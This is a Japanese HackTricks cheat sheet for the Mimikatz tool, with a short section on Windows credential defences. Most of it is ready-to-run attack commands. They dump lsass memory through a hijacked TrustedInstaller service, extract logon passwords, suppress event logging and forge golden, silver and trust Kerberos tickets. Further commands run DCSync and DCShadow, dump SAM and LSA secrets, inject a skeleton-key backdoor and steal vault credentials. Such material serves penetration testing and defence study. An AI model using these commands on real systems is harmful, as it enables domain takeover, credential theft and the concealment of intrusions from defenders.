# Mimikatz

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**してみたいですか？または、**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

**このページは[adsecurity.org](https://adsecurity.org/?page\_id=1821)のページを元にしています**。詳細については元のページをご確認ください！

## メモリ内のLMハッシュとクリアテキスト

Windows 8.1およびWindows Server 2012 R2以降、資格情報の盗難に対する重要な対策が実施されています：

- **LMハッシュと平文パスワード**はセキュリティを強化するためにメモリに保存されなくなりました。特定のレジストリ設定、_HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ にDWORD値 `0` を設定してDigest認証を無効にし、LSASSに"クリアテキスト"パスワードがキャッシュされないようにする必要があります。

- **LSA Protection**は、ローカルセキュリティ機関（LSA）プロセスを未承認のメモリ読み取りやコードインジェクションから保護するために導入されました。これはLSASSを保護されたプロセスとしてマークすることで実現されます。LSA Protectionの有効化には以下が必要です：
1. `RunAsPPL` を `dword:00000001` に設定して、レジストリを _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ で変更します。
2. このレジストリ変更を管理されたデバイス全体に強制するグループポリシーオブジェクト（GPO）を実装します。

これらの保護策にもかかわらず、MimikatzなどのツールはLSA Protectionを特定のドライバを使用して回避できますが、そのような行動はイベントログに記録される可能性があります。

### SeDebugPrivilegeの削除に対抗する

通常、管理者にはプログラムのデバッグを許可するSeDebugPrivilegeがあります。この特権は、攻撃者がメモリから資格情報を抽出するために使用する一般的なテクニックである無許可のメモリダンプを防ぐために制限できます。ただし、この特権が削除されていても、TrustedInstallerアカウントはカスタマイズされたサービス構成を使用してメモリダンプを実行できます。
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
これにより、`lsass.exe`のメモリをファイルにダンプし、その後別のシステムで分析して資格情報を抽出することができます。
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatzのオプション

Mimikatzでのイベントログ改ざんには、主に2つのアクションが関与します：イベントログの消去と新しいイベントの記録を防ぐためにイベントサービスをパッチすることです。以下はこれらのアクションを実行するためのコマンドです：

#### イベントログの消去

- **コマンド**：このアクションはイベントログを削除し、悪意のある活動を追跡するのを困難にします。
- Mimikatzは、標準ドキュメントで直接イベントログを消去するためのコマンドを提供していません。ただし、イベントログの操作は通常、Mimikatzのコマンドラインを介して直接行うのではなく、特定のログを消去するためにシステムツールやスクリプトを使用することが一般的です（例：PowerShellやWindowsイベントビューアを使用）。

#### 実験的機能：イベントサービスのパッチ

- **コマンド**：`event::drop`
- この実験的なコマンドは、イベントログサービスの動作を変更し、新しいイベントの記録を防ぐように設計されています。
- 例：`mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug`コマンドは、Mimikatzがシステムサービスを変更するために必要な特権で動作することを確認します。
- `event::drop`コマンドは、その後イベントログサービスをパッチします。


### Kerberosチケット攻撃

### ゴールデンチケットの作成

ゴールデンチケットはドメイン全体へのアクセス権限を与えます。主要なコマンドとパラメータ：

- コマンド：`kerberos::golden`
- パラメータ：
- `/domain`：ドメイン名。
- `/sid`：ドメインのセキュリティ識別子（SID）。
- `/user`：なりすますユーザー名。
- `/krbtgt`：ドメインのKDCサービスアカウントのNTLMハッシュ。
- `/ptt`：チケットを直接メモリに注入します。
- `/ticket`：後で使用するためにチケットを保存します。

例：
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Ticketsは特定のサービスへのアクセスを許可します。主要なコマンドとパラメータは以下の通りです:

- コマンド: Golden Ticketに似ていますが、特定のサービスを対象とします。
- パラメータ:
- `/service`: ターゲットとするサービス（例: cifs、http）。
- その他のパラメータはGolden Ticketと類似しています。

例:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### 信頼チケットの作成

信頼チケットは、信頼関係を活用して異なるドメイン間のリソースにアクセスするために使用されます。主要なコマンドとパラメーターは以下の通りです:

- コマンド: 信頼関係用のゴールデンチケットに類似したもの。
- パラメーター:
  - `/target`: ターゲットドメインのFQDN。
  - `/rc4`: 信頼アカウントのNTLMハッシュ。

例:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### 追加のKerberosコマンド

- **チケットのリスト表示**:
- コマンド: `kerberos::list`
- 現在のユーザーセッションのすべてのKerberosチケットをリスト表示します。

- **キャッシュのパス**:
- コマンド: `kerberos::ptc`
- キャッシュファイルからKerberosチケットを注入します。
- 例: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **チケットのパス**:
- コマンド: `kerberos::ptt`
- 他のセッションでKerberosチケットを使用できるようにします。
- 例: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **チケットのクリア**:
- コマンド: `kerberos::purge`
- セッションからすべてのKerberosチケットをクリアします。
- 衝突を避けるためにチケット操作コマンドを使用する前に便利です。


### Active Directoryの改ざん

- **DCShadow**: 一時的にマシンをDCとして操作してADオブジェクトを操作します。
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DCを模倣してパスワードデータをリクエストします。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### 資格情報アクセス

- **LSADUMP::LSA**: LSAから資格情報を抽出します。
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: コンピューターアカウントのパスワードデータを使用してDCを偽装します。
- *元のコンテキストにはNetSyncのための特定のコマンドが提供されていません。*

- **LSADUMP::SAM**: ローカルSAMデータベースにアクセスします。
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: レジストリに保存されたシークレットを復号化します。
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: ユーザーの新しいNTLMハッシュを設定します。
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: 信頼認証情報を取得します。
- `mimikatz "lsadump::trust" exit`

### その他

- **MISC::Skeleton**: DCのLSASSにバックドアを注入します。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### 特権昇格

- **PRIVILEGE::Backup**: バックアップ権限を取得します。
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: デバッグ特権を取得します。
- `mimikatz "privilege::debug" exit`

### 資格情報ダンプ

- **SEKURLSA::LogonPasswords**: ログオン中のユーザーの資格情報を表示します。
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: メモリからKerberosチケットを抽出します。
- `mimikatz "sekurlsa::tickets /export" exit`

### SIDとトークンの操作

- **SID::add/modify**: SIDとSIDHistoryを変更します。
- 追加: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- 修正: *元のコンテキストには修正のための特定のコマンドが提供されていません。*

- **TOKEN::Elevate**: トークンを偽装します。
- `mimikatz "token::elevate /domainadmin" exit`

### ターミナルサービス

- **TS::MultiRDP**: 複数のRDPセッションを許可します。
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDPセッションをリスト表示します。
- *元のコンテキストにはTS::Sessionsのための特定のコマンドが提供されていません。*

### Vault

- Windows Vaultからパスワードを抽出します。
- `mimikatz "vault::cred /patch" exit`
